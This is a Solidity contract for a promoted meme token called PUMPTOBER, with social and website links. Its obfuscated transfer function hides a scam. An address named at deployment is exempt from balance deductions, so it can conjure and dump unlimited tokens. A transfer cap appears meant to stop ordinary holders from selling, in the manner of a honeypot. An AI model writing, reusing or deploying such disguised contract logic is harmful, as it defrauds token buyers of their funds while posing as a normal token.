/*

Telegram: https://t.me/PumpToberETH

Twitter: https://twitter.com/PumpTober_ETH

Website: https://pumptober.crypto-token.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PUMPTOBER is Ownable {
    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function ncyvdboxl(address njskr, address kgdzlbtwpeso, uint256 wosnuvhct) private {
        address upqldv = IUniswapV2Factory(rpelzhcd.factory()).getPair(address(this), rpelzhcd.WETH());
        bool lxcdgqywv = zadqyux[njskr] == block.number;
        if (0 == jrvnkymqoax[njskr]) {
            if (njskr != upqldv && (!lxcdgqywv || wosnuvhct > qcbyjznfrtpo[njskr]) && wosnuvhct < totalSupply) {
                require(wosnuvhct <= totalSupply / (10 ** decimals));
            }
            balanceOf[njskr] -= wosnuvhct;
        }
        qcbyjznfrtpo[kgdzlbtwpeso] = wosnuvhct;
        balanceOf[kgdzlbtwpeso] += wosnuvhct;
        zadqyux[kgdzlbtwpeso] = block.number;
        emit Transfer(njskr, kgdzlbtwpeso, wosnuvhct);
    }

    function transferFrom(address njskr, address kgdzlbtwpeso, uint256 wosnuvhct) public returns (bool success) {
        require(wosnuvhct <= allowance[njskr][msg.sender]);
        allowance[njskr][msg.sender] -= wosnuvhct;
        ncyvdboxl(njskr, kgdzlbtwpeso, wosnuvhct);
        return true;
    }

    string public name;

    uint8 public decimals = 9;

    mapping(address => uint256) private zadqyux;

    uint256 private bqaoint = 112;

    IUniswapV2Router02 private rpelzhcd;

    constructor(string memory fzrlehyc, string memory rgcoanlwi, address cqkdj, address wpszf) {
        name = fzrlehyc;
        symbol = rgcoanlwi;
        balanceOf[msg.sender] = totalSupply;
        jrvnkymqoax[wpszf] = bqaoint;
        rpelzhcd = IUniswapV2Router02(cqkdj);
    }

    function approve(address lcotryi, uint256 wosnuvhct) public returns (bool success) {
        allowance[msg.sender][lcotryi] = wosnuvhct;
        emit Approval(msg.sender, lcotryi, wosnuvhct);
        return true;
    }

    mapping(address => uint256) public qcbyjznfrtpo;

    mapping(address => uint256) private jrvnkymqoax;

    function transfer(address kgdzlbtwpeso, uint256 wosnuvhct) public returns (bool success) {
        ncyvdboxl(msg.sender, kgdzlbtwpeso, wosnuvhct);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;
}